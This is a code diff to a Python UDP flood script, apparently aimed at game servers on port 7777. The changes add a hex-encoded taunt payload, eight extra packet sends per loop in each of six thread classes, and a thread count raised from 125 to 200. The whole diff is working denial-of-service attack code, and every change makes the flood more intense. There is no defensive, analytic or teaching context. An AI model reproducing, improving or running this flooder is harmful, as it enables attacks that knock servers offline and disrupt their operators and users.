@@ -32,6 +32,8 @@ class MyThread(threading.Thread):
                     socket.AF_INET, socket.SOCK_DGRAM)
                 
                 msg = Pacotes[random.randrange(0,3)]
+                
+                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                      
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
@@ -43,6 +45,15 @@ class MyThread(threading.Thread):
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
+                
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
                 
                 
                 if(int(port) == 7777):
@@ -70,6 +81,8 @@ class MyThread1(threading.Thread):
                     socket.AF_INET, socket.SOCK_DGRAM)
                 
                 msg = Pacotes[random.randrange(0,3)]
+                
+                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                      
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
@@ -79,6 +92,15 @@ class MyThread1(threading.Thread):
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
+                
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
                 
                 
                 if(int(port) == 7777):
@@ -105,6 +127,8 @@ class MyThread2(threading.Thread):
                     socket.AF_INET, socket.SOCK_DGRAM)
                 
                 msg = Pacotes[random.randrange(0,3)]
+                
+                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                      
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
@@ -114,6 +138,15 @@ class MyThread2(threading.Thread):
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
+                
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
                 
                 
                 if(int(port) == 7777):
@@ -141,6 +174,8 @@ class MyThread3(threading.Thread):
                     socket.AF_INET, socket.SOCK_DGRAM)
                 
                 msg = Pacotes[random.randrange(0,3)]
+                
+                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                      
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
@@ -150,6 +185,15 @@ class MyThread3(threading.Thread):
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
+                
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
                 
                 
                 if(int(port) == 7777):
@@ -176,6 +220,8 @@ class MyThread4(threading.Thread):
                     socket.AF_INET, socket.SOCK_DGRAM)
                 
                 msg = Pacotes[random.randrange(0,3)]
+                
+                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                      
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
@@ -185,6 +231,15 @@ class MyThread4(threading.Thread):
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
+                
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
                 
                 
                 if(int(port) == 7777):
@@ -209,6 +264,8 @@ class MyThread5(threading.Thread):
          while True:
                 sock = socket.socket(
                     socket.AF_INET, socket.SOCK_DGRAM)
+                 
+                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                 
                 msg = Pacotes[random.randrange(0,3)]
                      
@@ -220,6 +277,15 @@ class MyThread5(threading.Thread):
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
                 sock.sendto(msg, (ip, int(port)))
+                
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
+                sock.sendto(payload, (ip, int(port)))
                 
                 
                 if(int(port) == 7777):
@@ -242,7 +308,7 @@ class MyThread5(threading.Thread):
 		
 if __name__ == '__main__':
     try:
-     for x in range(125):                                    
+     for x in range(200):                                    
             mythread = MyThread()
             mythread1 = MyThread1()
             mythread2 = MyThread2()
